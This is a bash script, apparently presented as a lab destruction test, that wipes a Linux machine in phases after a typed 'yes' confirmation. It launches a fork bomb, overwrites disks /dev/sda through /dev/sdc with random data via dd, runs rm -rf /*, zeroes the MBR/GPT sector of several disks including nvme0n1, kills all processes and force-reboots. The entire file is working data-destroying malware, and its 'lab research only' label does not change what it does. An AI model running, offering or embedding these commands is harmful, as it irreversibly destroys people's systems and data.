#!/bin/bash
# ============================================================
# TRIPLE KILL - BRUTAL VERSION (MBR/GPT DESTROYED)
# FOR LAB RESEARCH ONLY!
# SYSTEM WILL NOT BOOT AFTER THIS!
# ============================================================

echo "WARNING: This script will COMPLETELY DESTROY the system!"
echo "  - MBR/GPT will be wiped"
echo "  - All data will be lost"
echo "  - System will NOT boot again"
echo "  - Requires full reinstall from USB/DVD"
echo ""
echo "Type 'yes' to continue:"
read confirm

if [[ "${confirm,,}" != "yes" ]]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "Starting in 5 seconds..."
sleep 5
echo "GO!"
echo ""

# ============================================================
# PHASE 1: FORK BOMB
# ============================================================
echo "[PHASE 1] Fork bomb..."
cat > /tmp/fork_bomb.sh << 'EOF'
#!/bin/bash
:(){ :|:& };:
EOF

chmod +x /tmp/fork_bomb.sh
/tmp/fork_bomb.sh &
echo "Fork bomb running."

# ============================================================
# PHASE 2: DISK FILLER - DIRECT TO DISK
# ============================================================
echo "[PHASE 2] Disk filler (writing directly to disk)..."
(
    dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null &
    dd if=/dev/urandom of=/dev/sdb bs=1M 2>/dev/null &
    dd if=/dev/urandom of=/dev/sdc bs=1M 2>/dev/null &
) &
echo "Disk filler running."

# ============================================================
# PHASE 3: DELETE ALL SYSTEM FILES
# ============================================================
echo "[PHASE 3] Deleting ALL system files..."
(
    rm -rf /* 2>/dev/null &
) &
echo "All system files deleted."

# ============================================================
# PHASE 4: DESTROY MBR/GPT
# ============================================================
echo "[PHASE 4] Destroying MBR/GPT..."
(
    dd if=/dev/zero of=/dev/sda bs=512 count=1 2>/dev/null
    dd if=/dev/zero of=/dev/sdb bs=512 count=1 2>/dev/null
    dd if=/dev/zero of=/dev/sdc bs=512 count=1 2>/dev/null
    dd if=/dev/zero of=/dev/nvme0n1 bs=512 count=1 2>/dev/null
) &
echo "MBR/GPT destroyed."

# ============================================================
# PHASE 5: KILL ALL PROCESSES
# ============================================================
echo "[PHASE 5] Killing all processes..."
pkill -9 -f . 2>/dev/null &
echo "Processes killed."

# ============================================================
# FINAL
# ============================================================
echo ""
echo "============================================================"
echo "SYSTEM COMPLETELY DESTROYED"
echo "  CPU: Overloaded (fork bomb)"
echo "  Disk: Overwritten with random data"
echo "  OS: Completely deleted"
echo "  MBR/GPT: WIPED (ZEROED OUT)"
echo "  Boot: IMPOSSIBLE"
echo ""
echo "THIS SYSTEM WILL NEVER BOOT AGAIN"
echo "You need to reinstall from USB/DVD"
echo ""
echo "Rebooting in 5 seconds..."
echo "============================================================"

sleep 5
reboot -f
